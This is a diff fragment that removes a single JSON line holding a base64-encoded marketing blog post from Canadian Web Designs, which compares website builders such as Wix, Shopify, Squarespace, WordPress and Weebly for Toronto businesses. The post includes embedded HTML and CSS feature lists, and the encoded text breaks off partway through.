@@ -1,1 +1,306 @@
-{"data":"LS0tCnRpdGxlOiAiVGhlIFVsdGltYXRlIEd1aWRlIHRvIHRoZSBCZXN0IFdlYnNpdGUgQnVpbGRlcnMgZm9yIENhbmFkaWFuIFdlYiBEZXNpZ25zIgpzbHVnOiAidWx0aW1hdGUtZ3VpZGUtdG8tdGhlLWJlc3Qtd2Vic2l0ZS1idWlsZGVycyIKZGF0ZTogIjIwMjQtMDctMDUiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIlRoZSBVbHRpbWF0ZSBHdWlkZSB0byB0aGUgQmVzdCBXZWJzaXRlIEJ1aWxkZXJzIGZvciBDYW5hZGlhbiBXZWIgRGVzaWducyIKa2V5d29yZHM6IFsidWx0aW1hdGUgZ3VpZGUgdG8gdGhlIGJlc3Qgd2Vic2l0ZSBidWlsZGVycyIsIldlYiBEZXNpZ24iXQpjYXRlZ29yeTogIldlYiBEZXNpZ24iCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjQvMDcvNDI2NjEyMl8yMjQ3MTMyLmpwZyIKLS0tCgo8cD5JbiB0aGUgYnVzdGxpbmcgZGlnaXRhbCBsYW5kc2NhcGUgb2YgVG9yb250byBhbmQgdGhlIEdyZWF0ZXIgVG9yb250byBBcmVhIChHVEEpLCBlc3RhYmxpc2hpbmcgYSByb2J1c3Qgb25saW5lIHByZXNlbmNlIGlzIG5vIGxvbmdlciBvcHRpb25hbOKAlGl0J3MgYSBmdW5kYW1lbnRhbCBuZWNlc3NpdHkgZm9yIGJ1c2luZXNzZXMgYWltaW5nIHRvIHRocml2ZS4gWW91ciB3ZWJzaXRlIGlzIG9mdGVuIHRoZSBmaXJzdCBpbnRlcmFjdGlvbiBhIHBvdGVudGlhbCBjdXN0b21lciBoYXMgd2l0aCB5b3VyIGJyYW5kLCBtYWtpbmcgaXRzIHF1YWxpdHksIGZ1bmN0aW9uYWxpdHksIGFuZCB1c2VyIGV4cGVyaWVuY2UgcGFyYW1vdW50LiBOYXZpZ2F0aW5nIHRoZSBteXJpYWQgb2Ygd2Vic2l0ZSBidWlsZGVycyBhdmFpbGFibGUgY2FuIGJlIG92ZXJ3aGVsbWluZywgYnV0IHNlbGVjdGluZyB0aGUgcmlnaHQgb25lIGlzIGNydWNpYWwgZm9yIHN1Y2Nlc3MuIFRoaXMgdWx0aW1hdGUgZ3VpZGUgd2lsbCBkZW15c3RpZnkgdGhlIHByb2Nlc3MsIG9mZmVyaW5nIGluc2lnaHRzIGFuZCB0aXBzIHRvIGhlbHAgPGEgaHJlZj0iaHR0cHM6Ly93d3cuY2FuYWRhLmNhL2VuL3NlcnZpY2VzL2J1c2luZXNzL3Jlc2VhcmNoL2RpcmVjdG9yaWVzY2FuYWRpYW5jb21wYW5pZXMuaHRtbCI+Q2FuYWRpYW4gYnVzaW5lc3NlczwvYT4sIHBhcnRpY3VsYXJseSB0aG9zZSBpbiBUb3JvbnRvIGFuZCB0aGUgR1RBLCBjaG9vc2UgdGhlIHBlcmZlY3QgcGxhdGZvcm0uPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5XaHkgYSBTdHJvbmcgT25saW5lIFByZXNlbmNlIE1hdHRlcnMgZm9yIFRvcm9udG8gJmFtcDsgR1RBIEJ1c2luZXNzZXM8L2gyPgoKPHA+Rm9yIGJ1c2luZXNzZXMgaW4gYSBjb21wZXRpdGl2ZSBtYXJrZXQgbGlrZSBUb3JvbnRvIGFuZCB0aGUgR1RBLCBhIHdlbGwtZGVzaWduZWQgd2Vic2l0ZSBhY3RzIGFzIGEgMjQvNyBzdG9yZWZyb250LCBhIHBvd2VyZnVsIG1hcmtldGluZyB0b29sLCBhbmQgYSBodWIgZm9yIGN1c3RvbWVyIGVuZ2FnZW1lbnQuIEl0IGJ1aWxkcyB0cnVzdCwgZXN0YWJsaXNoZXMgYXV0aG9yaXR5LCBhbmQgcHJvdmlkZXMgaW1tZWRpYXRlIGFjY2VzcyB0byBpbmZvcm1hdGlvbiBmb3IgeW91ciB0YXJnZXQgYXVkaWVuY2UuIFdoZXRoZXIgeW91J3JlIGEgbG9jYWwgYm91dGlxdWUsIGEgYnVkZGluZyBzdGFydHVwLCBvciBhbiBlc3RhYmxpc2hlZCBlbnRlcnByaXNlLCB5b3VyIHdlYnNpdGUgbmVlZHMgdG8gYmUgdGVjaG5pY2FsbHkgc291bmQsIHVzZXItZnJpZW5kbHksIGFuZCBvcHRpbWl6ZWQgZm9yIHNlYXJjaCBlbmdpbmVzIHRvIGNhcHR1cmUgdGhlIGF0dGVudGlvbiBvZiBsb2NhbCBzZWFyY2hlcnMuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5LZXkgQ29uc2lkZXJhdGlvbnMgZm9yIENhbmFkaWFuIEJ1c2luZXNzZXM8L2gzPgoKPHA+V2hlbiBjaG9vc2luZyBhIHdlYnNpdGUgYnVpbGRlciwgQ2FuYWRpYW4gYnVzaW5lc3NlcyBzaG91bGQgcHJpb3JpdGl6ZSBmZWF0dXJlcyB0aGF0IGVuc3VyZSBsb2NhbCByZWxldmFuY2UgYW5kIGNvbXBsaWFuY2U6PC9wPgoKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+V2Vic2l0ZSBGZWF0dXJlczwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgLyogQmFzaWMgY3VzdG9tIHN0eWxlcyBmb3IgbWluaW1hbCBpbXBhY3QgKi8KICAgICAgICAjY3VzdG9tLXdlYnNpdGUtYnVpbGRlci1mZWF0dXJlcyB7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsKICAgICAgICAgICAgbWF4LXdpZHRoOiAxMDAlOwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBjb2xvcjogIzMzMzsKICAgICAgICAgICAgcGFkZGluZzogMjBweDsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDRweCA2cHggcmdiYSgwLCAwLCAwLCAwLjEpOwogICAgICAgIH0KCiAgICAgICAgI2N1c3RvbS13ZWJzaXRlLWJ1aWxkZXItZmVhdHVyZXMgaDMgewogICAgICAgICAgICBmb250LXNpemU6IDIwcHg7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgICAgICBjb2xvcjogIzJkMzc0ODsKICAgICAgICB9CgogICAgICAgICNjdXN0b20td2Vic2l0ZS1idWlsZGVyLWZlYXR1cmVzIHAgewogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICAgICAgICBsaW5lLWhlaWdodDogMS42OwogICAgICAgICAgICBjb2xvcjogIzU1NTsKICAgICAgICB9CgogICAgICAgICNjdXN0b20td2Vic2l0ZS1idWlsZGVyLWZlYXR1cmVzIHVsIHsKICAgICAgICAgICAgbGlzdC1zdHlsZTogbm9uZTsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIH0KCiAgICAgICAgI2N1c3RvbS13ZWJzaXRlLWJ1aWxkZXItZmVhdHVyZXMgdWwgbGkgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjlmOWY5OwogICAgICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA2cHg7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNlZWU7CiAgICAgICAgfQoKICAgICAgICAjY3VzdG9tLXdlYnNpdGUtYnVpbGRlci1mZWF0dXJlcyB1bCBsaTpsYXN0LWNoaWxkIHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPCEtLSBNYWluIGNvbnRhaW5lciBmb3IgdGhlIGN1c3RvbSBjb250ZW50LiBUaGlzIElEIGhlbHBzIHNjb3BlIHN0eWxlcy4gLS0+CiAgICA8ZGl2IGlkPSJjdXN0b20td2Vic2l0ZS1idWlsZGVyLWZlYXR1cmVzIiBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMzBweDsiPgogICAgICAgIDx1bCBjbGFzcz0ic3BhY2UteS00Ij4KICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgPGgzPkVhc2Ugb2YgVXNlPC9oMz4KICAgICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgICAgIEEgcGxhdGZvcm0gd2l0aCBhbiBpbnR1aXRpdmUgZHJhZy1hbmQtZHJvcCBpbnRlcmZhY2UgYWxsb3dzIGZvciBxdWljayB1cGRhdGVzIGFuZCBtYW5hZ2VtZW50IHdpdGhvdXQgbmVlZGluZyBleHRlbnNpdmUgY29kaW5nIGtub3dsZWRnZS4gVGhpcyBzaW1wbGlmaWVzIHRoZSBwcm9jZXNzIGZvciBhbnlvbmUsIHJlZ2FyZGxlc3Mgb2YgdGVjaG5pY2FsIHNraWxsLgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2xpPgoKICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgPGgzPkN1c3RvbWl6YXRpb24gJiBEZXNpZ24gRmxleGliaWxpdHk8L2gzPgogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgWW91ciBicmFuZCBpcyB1bmlxdWUuIFRoZSBidWlsZGVyIHNob3VsZCBvZmZlciBkaXZlcnNlIHRlbXBsYXRlcyBhbmQgZXh0ZW5zaXZlIGRlc2lnbiBvcHRpb25zIHRoYXQgdHJ1bHkgcmVmbGVjdCB5b3VyIGlkZW50aXR5IGFuZCBhbGxvdyBmb3Igc2VhbWxlc3MgZnV0dXJlIHNjYWxhYmlsaXR5IGFzIHlvdXIgYnVzaW5lc3MgZ3Jvd3MuCiAgICAgICAgICAgICAgICA8L3A+CiAgICAgICAgICAgIDwvbGk+CgogICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICA8aDM+RS1jb21tZXJjZSBDYXBhYmlsaXRpZXM8L2gzPgogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgSWYgeW91IHBsYW4gdG8gc2VsbCBwcm9kdWN0cyBvciBzZXJ2aWNlcyBvbmxpbmUsIHJvYnVzdCBlLWNvbW1lcmNlIGZlYXR1cmVzLCBpbmNsdWRpbmcgc3VwcG9ydCBmb3IgQ2FuYWRpYW4gcGF5bWVudCBnYXRld2F5cyBhbmQgdmVyc2F0aWxlIHNoaXBwaW5nIG9wdGlvbnMsIGFyZSBhYnNvbHV0ZWx5IGVzc2VudGlhbCBmb3IgeW91ciBvcGVyYXRpb25zLgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2xpPgoKICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgPGgzPlNFTyBGcmllbmRsaW5lc3M8L2gzPgogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgVG8gcmFuayB3ZWxsIGluIGxvY2FsIFRvcm9udG8gc2VhcmNoZXMgYW5kIGJleW9uZCwgdGhlIGJ1aWxkZXIgbXVzdCBzdXBwb3J0IFNFTyBiZXN0IHByYWN0aWNlcyBsaWtlIGN1c3RvbSBtZXRhIGRlc2NyaXB0aW9ucywgY2xlYW4sIHJlYWRhYmxlIFVSTHMsIGFuZCBvcHRpbWl6ZWQgZmFzdCBsb2FkaW5nIHRpbWVzIHRvIGVuc3VyZSB2aXNpYmlsaXR5LgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2xpPgoKICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgPGgzPlJlc3BvbnNpdmUgRGVzaWduPC9oMz4KICAgICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgICAgIEEgd2Vic2l0ZSB0aGF0IGFkYXB0cyBzZWFtbGVzc2x5IHRvIGRlc2t0b3BzLCB0YWJsZXRzLCBhbmQgc21hcnRwaG9uZXMgaXMgY3JpdGljYWwgZm9yIHByb3ZpZGluZyBhIGNvbnNpc3RlbnQgYW5kIHBvc2l0aXZlIHVzZXIgZXhwZXJpZW5jZSBhY3Jvc3MgYWxsIGRldmljZXMgYW5kIHNjcmVlbiBzaXplcy4KICAgICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgPC9saT4KCiAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgIDxoMz5DdXN0b21lciBTdXBwb3J0PC9oMz4KICAgICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgICAgIFJlbGlhYmxlIGFuZCBhY2Nlc3NpYmxlIGN1c3RvbWVyIHN1cHBvcnQgaXMgaW52YWx1YWJsZSwgZXNwZWNpYWxseSBmb3IgbmV3Y29tZXJzIHRvIHdlYnNpdGUgbWFuYWdlbWVudCwgb2ZmZXJpbmcgcGVhY2Ugb2YgbWluZCBhbmQgcXVpY2sgc29sdXRpb25zIHdoZW4gbmVlZGVkLgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2xpPgoKICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgPGgzPlByaWNpbmcgJiBTY2FsYWJpbGl0eTwvaDM+CiAgICAgICAgICAgICAgICA8cD4KICAgICAgICAgICAgICAgICAgICBDb25zaWRlciB0aGUgcHJpY2luZyBzdHJ1Y3R1cmUgYW5kIGhvdyB3ZWxsIHRoZSBwbGF0Zm9ybSBzY2FsZXMgd2l0aCB5b3VyIGJ1c2luZXNzIG5lZWRzLiBJdCBzaG91bGQgb2ZmZXIgZmxleGlibGUgcGxhbnMgdGhhdCBhY2NvbW1vZGF0ZSBncm93dGggd2l0aG91dCBoaWRkZW4gY29zdHMuCiAgICAgICAgICAgICAgICA8L3A+CiAgICAgICAgICAgIDwvbGk+CiAgICAgICAgPC91bD4KICAgIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+VG9wIFdlYnNpdGUgQnVpbGRlcnMgZm9yIENhbmFkaWFuIFdlYiBEZXNpZ25zPC9oMz4KCjxwPkJhc2VkIG9uIG91ciBleHBlcnRpc2UgaW4gd2ViIGRlc2lnbiBhbmQgZGV2ZWxvcG1lbnQsIGhlcmUgYXJlIHNvbWUgb2YgdGhlIGJlc3Qgd2Vic2l0ZSBidWlsZGVycyBzdWl0ZWQgZm9yIENhbmFkaWFuIGJ1c2luZXNzZXMsIG9mZmVyaW5nIGZlYXR1cmVzIHRoYXQgY29udHJpYnV0ZSB0byBoaWdoLXF1YWxpdHkgY29udGVudCwgdXNlciBleHBlcmllbmNlLCBhbmQgdGVjaG5pY2FsIGZvdW5kYXRpb246PC9wPgoKPG9sIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPjxzdHJvbmc+V2l4Ojwvc3Ryb25nPgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+PHN0cm9uZz5Qcm9zOjwvc3Ryb25nPiBSZW5vd25lZCBmb3IgaXRzIHVucGFyYWxsZWxlZCBlYXNlIG9mIHVzZSB3aXRoIGEgcG93ZXJmdWwgZHJhZy1hbmQtZHJvcCBlZGl0b3IuIDxhIGhyZWY9Imh0dHBzOi8vd3d3LndpeC5jb20vIj5XaXggPC9hPm9mZmVycyBodW5kcmVkcyBvZiBkZXNpZ25lci1tYWRlIHRlbXBsYXRlcyBhbmQgYSB2YXN0IGFwcCBtYXJrZXQgZm9yIGFkZGVkIGZ1bmN0aW9uYWxpdHkuIEl0J3MgZXhjZWxsZW50IGZvciBzbWFsbCB0byBtZWRpdW0tc2l6ZWQgYnVzaW5lc3NlcyBsb29raW5nIGZvciBhIHZpc3VhbGx5IHJpY2ggc2l0ZSB3aXRob3V0IGNvZGluZy48L2xpPgoKPGxpPjxzdHJvbmc+Q29uczo8L3N0cm9uZz4gT25jZSBhIHRlbXBsYXRlIGlzIGNob3NlbiwgaXQncyBjaGFsbGVuZ2luZyB0byBzd2l0Y2guIFNvbWUgbGFyZ2VyIHNpdGVzIG1pZ2h0IGV4cGVyaWVuY2Ugc2xvd2VyIGxvYWRpbmcgdGltZXMuPC9saT4KCjxsaT48c3Ryb25nPklkZWFsIGZvcjo8L3N0cm9uZz4gUG9ydGZvbGlvIHNpdGVzLCBzbWFsbCBidXNpbmVzcyB3ZWJzaXRlcywgYW5kIGUtY29tbWVyY2Ugc3RvcmVzIHdpdGggbW9kZXJhdGUgcHJvZHVjdCBjb3VudHMuPC9saT4KPC91bD4KPC9saT4KCjxsaT48c3Ryb25nPlNob3BpZnk6PC9zdHJvbmc+Cjx1bCBjbGFzcz0id3AtYmxvY2stbGlzdCI+CjxsaT48c3Ryb25nPlByb3M6PC9zdHJvbmc+IFRoZSB1bmRpc3B1dGVkIGxlYWRlciBpbiBlLWNvbW1lcmNlLCA8YSBocmVmPSJodHRwczovL3d3dy5zaG9waWZ5LmNvbS8iPlNob3BpZnk8L2E+IGlzIHB1cnBvc2UtYnVpbHQgZm9yIG9ubGluZSBzdG9yZXMuIEl0IG9mZmVycyByb2J1c3QgaW52ZW50b3J5IG1hbmFnZW1lbnQsIHNlY3VyZSBwYXltZW50IHByb2Nlc3NpbmcsIG1hcmtldGluZyB0b29scywgYW5kIENhbmFkaWFuIHNoaXBwaW5nIGludGVncmF0aW9ucy48L2xpPgoKPGxpPjxzdHJvbmc+Q29uczo8L3N0cm9uZz4gUHJpbWFyaWx5IGZvY3VzZWQgb24gZS1jb21tZXJjZSwgbWFraW5nIGl0IGxlc3MgaWRlYWwgZm9yIGNvbnRlbnQtaGVhdnkgYmxvZ3Mgb3IgaW5mb3JtYXRpb25hbCBzaXRlcyB3aXRob3V0IHByb2R1Y3RzLiBDYW4gYmUgbW9yZSBleHBlbnNpdmUgdGhhbiBvdGhlciBidWlsZGVycy48L2xpPgoKPGxpPjxzdHJvbmc+SWRlYWwgZm9yOjwvc3Ryb25nPiBBbnkgQ2FuYWRpYW4gYnVzaW5lc3MsIGZyb20gVG9yb250byBzdGFydHVwcyB0byBlc3RhYmxpc2hlZCByZXRhaWxlcnMsIHNlbGxpbmcgcGh5c2ljYWwgb3IgZGlnaXRhbCBwcm9kdWN0cyBvbmxpbmUuPC9saT4KPC91bD4KPC9saT4KCjxsaT48c3Ryb25nPlNxdWFyZXNwYWNlOjwvc3Ryb25nPgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+PHN0cm9uZz5Qcm9zOjwvc3Ryb25nPiBLbm93biBmb3IgaXRzIHN0dW5uaW5nLCBhd2FyZC13aW5uaW5nIHRlbXBsYXRlcyBhbmQgc3Ryb25nIHZpc3VhbCBhcHBlYWwuIFNxdWFyZXNwYWNlIGlzIHBlcmZlY3QgZm9yIGNyZWF0aXZlcywgcGhvdG9ncmFwaGVycywgYXJ0aXN0cywgYW5kIGJ1c2luZXNzZXMgdGhhdCBwcmlvcml0aXplIGFlc3RoZXRpY3MuIEl0IG9mZmVycyBpbnRlZ3JhdGVkIG1hcmtldGluZyB0b29scyBhbmQgc29saWQgU0VPIGZlYXR1cmVzLjwvbGk+Cgo8bGk+PHN0cm9uZz5Db25zOjwvc3Ryb25nPiBMZXNzIGZsZXhpYmxlIHRoYW4gV2l4IG9yIFdvcmRQcmVzcyBmb3IgZGVlcCBjdXN0b21pemF0aW9uLiBUaGUgbGVhcm5pbmcgY3VydmUgY2FuIGJlIHNsaWdodGx5IHN0ZWVwZXIgZm9yIGJlZ2lubmVycy48L2xpPgoKPGxpPjxzdHJvbmc+SWRlYWwgZm9yOjwvc3Ryb25nPiBEZXNpZ25lcnMsIGFydGlzdHMsIHBob3RvZ3JhcGhlcnMsIGFuZCBzZXJ2aWNlLWJhc2VkIGJ1c2luZXNzZXMgaW4gVG9yb250byB0aGF0IG5lZWQgYSBzbGVlaywgcHJvZmVzc2lvbmFsIG9ubGluZSBwcmVzZW5jZS48L2xpPgo8L3VsPgo8L2xpPgoKPGxpPjxzdHJvbmc+V29yZFByZXNzLm9yZyAoU2VsZi1Ib3N0ZWQgd2l0aCBhIEhvc3RpbmcgUHJvdmlkZXIgbGlrZSBTaXRlR3JvdW5kKTo8L3N0cm9uZz4KPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPjxzdHJvbmc+UHJvczo8L3N0cm9uZz4gVGhlIG1vc3QgZmxleGlibGUgYW5kIHBvd2VyZnVsIGNvbnRlbnQgbWFuYWdlbWVudCBzeXN0ZW0gKENNUykuIFdpdGggdGhvdXNhbmRzIG9mIHRoZW1lcyBhbmQgcGx1Z2lucywgV29yZFByZXNzIG9mZmVycyBlbmRsZXNzIGN1c3RvbWl6YXRpb24gYW5kIHNjYWxhYmlsaXR5LiBJdOKAmXMgZXhjZWxsZW50IGZvciBTRU8gYW5kIGJ1aWxkaW5nIGF1dGhvcml0eSB0aHJvdWdoIGNvbnRlbnQuPC9saT4KCjxsaT48c3Ryb25nPkNvbnM6PC9zdHJvbmc+IFJlcXVpcmVzIGEgaG9zdGluZyBwcm92aWRlciAobGlrZSBTaXRlR3JvdW5kKSBhbmQgYSBkb21haW4uIEl0IGhhcyBhIHN0ZWVwZXIgbGVhcm5pbmcgY3VydmUgYW5kIGRlbWFuZHMgbW9yZSB0ZWNobmljYWwgbWFpbnRlbmFuY2UuPC9saT4KCjxsaT48c3Ryb25nPklkZWFsIGZvcjo8L3N0cm9uZz4gQ29udGVudC1yaWNoIGJsb2dzLCBsYXJnZSBjb3Jwb3JhdGUgd2Vic2l0ZXMsIGFuZCBidXNpbmVzc2VzIHJlcXVpcmluZyBoaWdobHkgY3VzdG9taXplZCBmdW5jdGlvbmFsaXR5IG9yIGFkdmFuY2VkIFNFTyBzdHJhdGVnaWVzLjwvbGk+CjwvdWw+CjwvbGk+Cgo8bGk+PHN0cm9uZz48YSBocmVmPSJodHRwczovL3d3dy53ZWVibHkuY29tLyI+V2VlYmx5PC9hPjo8L3N0cm9uZz4KPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPjxzdHJvbmc+UHJvczo8L3N0cm9uZz4gRXh0cmVtZWx5IGJlZ2lubmVyLWZyaWVuZGx5IHdpdGggYSBzaW1wbGUgZHJhZy1hbmQtZHJvcCBpbnRlcmZhY2UgYW5kIGFmZm9yZGFibGUgcHJpY2luZy4gV2VlYmx5IG9mZmVycyBiYXNpYyBlLWNvbW1lcmNlIGZ1bmN0aW9uYWxpdHkgYW5kIG1vYmlsZS1yZXNwb25zaXZlIHRoZW1lcy48L2xpPgoKPGxpPjxzdHJvbmc+Q29uczo8L3N0cm9uZz4gTGltaXRlZCBkZXNpZ24gZmxleGliaWxpdHkgYW5kIGFwcCBpbnRlZ3JhdGlvbnMgY29tcGFyZWQgdG8gV2l4IG9yIFdvcmRQcmVzcy48L2xpPgoKPGxpPjxzdHJvbmc+SWRlYWwgZm9yOjwvc3Ryb25nPiBTbWFsbCBidXNpbmVzc2VzIG9yIGluZGl2aWR1YWxzIGluIFRvcm9udG8gbmVlZGluZyBhIHN0cmFpZ2h0Zm9yd2FyZCwgY29zdC1lZmZlY3RpdmUgd2Vic2l0ZSBxdWlja2x5LjwvbGk+CjwvdWw+CjwvbGk+Cjwvb2w+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSBzaXplLWxhcmdlIGlzLXJlc2l6ZWQiPjxpbWcgc3JjPSJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjQvMDcvMTEwNTQwMjhfNDYxMDktMTAyNHg5MTAuanBnIiBhbHQ9IndlYiBkZXZlbG9wbWVudCB0b3JvbnRvIiBjbGFzcz0id3AtaW1hZ2UtMTM2MjAiIHN0eWxlPSJ3aWR0aDo4NDBweDtoZWlnaHQ6YXV0byIvPjwvZmlndXJlPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5CdWlsZGluZyBUcnVzdCBhbmQgQXV0aG9yaXR5OiBDb250ZW50IGlzIEtpbmc8L2gzPgoKPHA+UmVnYXJkbGVzcyBvZiB0aGUgYnVpbGRlciB5b3UgY2hvb3NlLCBoaWdoLXF1YWxpdHksIGhlbHBmdWwgY29udGVudCBpcyBwYXJhbW91bnQuIEZvciBUb3JvbnRvIGFuZCBHVEEgYnVzaW5lc3NlcywgdGhpcyBtZWFuczo8L3A+Cgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+PHN0cm9uZz5Nb2JpbGUtRmlyc3QgRGVzaWduOjwvc3Ryb25nPiBFbnN1cmUgeW91ciBzaXRlIGxvb2tzIGFuZCBwZXJmb3JtcyBmbGF3bGVzc2x5IG9uIG1vYmlsZSBkZXZpY2VzLCBhcyBhIHNpZ25pZmljYW50IHBvcnRpb24gb2YgbG9jYWwgc2VhcmNoZXMgb2NjdXIgb24gc21hcnRwaG9uZXMuPC9saT4KCjxsaT48c3Ryb25nPkxvY2FsIFNFTzo8L3N0cm9uZz4gSW5jb3Jwb3JhdGUgbG9jYXRpb24tc3BlY2lmaWMga2V5d29yZHMgKGUuZy4sICJ3ZWIgZGVzaWduIFRvcm9udG8sIiAiPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evc2VhcmNoLWVuZ2luZS1vcHRpbWl6YXRpb24vIj5TRU8gVG9yb250byBHVEE8L2E+IikuPC9saT4KCjxsaT48c3Ryb25nPkluZm9ybWF0aW9uYWwgR3VpZGVzOjwvc3Ryb25nPiBQcm92aWRlIHZhbHVlIHRvIHlvdXIgYXVkaWVuY2Ugd2l0aCBhcnRpY2xlcywgdGlwcywgYW5kIGd1aWRlcyByZWxhdGVkIHRvIHlvdXIgaW5kdXN0cnkuIEZvciBleGFtcGxlLCAiSG93IHRvIENob29zZSB0aGUgQmVzdCBFLWNvbW1lcmNlIFBsYXRmb3JtIGluIFRvcm9udG8uIjwvbGk+Cgo8bGk+PHN0cm9uZz5DbGVhciBDYWxscyB0byBBY3Rpb246PC9zdHJvbmc+IEd1aWRlIHlvdXIgdmlzaXRvcnMgdG8gdGhlaXIgbmV4dCBzdGVwLCB3aGV0aGVyIGl0J3MgcmVxdWVzdGluZyBhIHF1b3RlIG9yIGxlYXJuaW5nIG1vcmUgYWJvdXQgeW91ciBzZXJ2aWNlcy48L2xpPgo8L3VsPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5PdXIgRXhwZXJ0aXNlIGF0IENhbmFkaWFuIFdlYiBEZXNpZ25zPC9oMz4KCjxwPkF0IDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhLyI+Q2FuYWRpYW4gV2ViIERlc2lnbnM8L2E+LCB3ZSB1bmRlcnN0YW5kIHRoZSBpbnRyaWNhY2llcyBvZiBidWlsZGluZyBhbiBpbXBhY3RmdWwgb25saW5lIHByZXNlbmNlLiBXZSBzcGVjaWFsaXplIGluIGNyZWF0aW5nIHZpc3VhbGx5IHN0dW5uaW5nIGFuZCB1c2VyLWZyaWVuZGx5IHdlYnNpdGVzIHRhaWxvcmVkIHRvIG1lZXQgb3VyIGNsaWVudOKAmXMgdW5pcXVlIG5lZWRzLiBPdXIgdGVhbSBvZiBleHBlcmllbmNlZCBkZXNpZ25lcnMgYW5kIGRldmVsb3BlcnMgdXNlcyB0aGUgbGF0ZXN0IHRlY2hub2xvZ2llcyBhbmQgZGVzaWduIHRyZW5kcyB0byBjcmVhdGUgd2Vic2l0ZXMgdGhhdCBhcmUgbm90IG9ubHkgYmVhdXRpZnVsIGJ1dCBhbHNvIGhpZ2hseSBmdW5jdGlvbmFsIGFuZCBlYXN5IHRvIG5hdmlnYXRlLiBXZSB1bmRlcnN0YW5kIHRoYXQgZXZlcnkgYnVzaW5lc3MgaXMgZGlmZmVyZW50LCBzbyB3ZSB0YWtlIHRoZSB0aW1lIHRvIGdldCB0byBrbm93IG91ciBjbGllbnRzIGFuZCB0aGVpciBzcGVjaWZpYyBuZWVkcyBiZWZvcmUgc3RhcnRpbmcgYW55IHByb2plY3QuPC9wPgoKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+T3VyIENvbXByZWhlbnNpdmUgU2VydmljZXM8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIC8qIE1pbmltYWwgc3R5bGVzIGZvciBhIHZlcnkgc2ltcGxlIE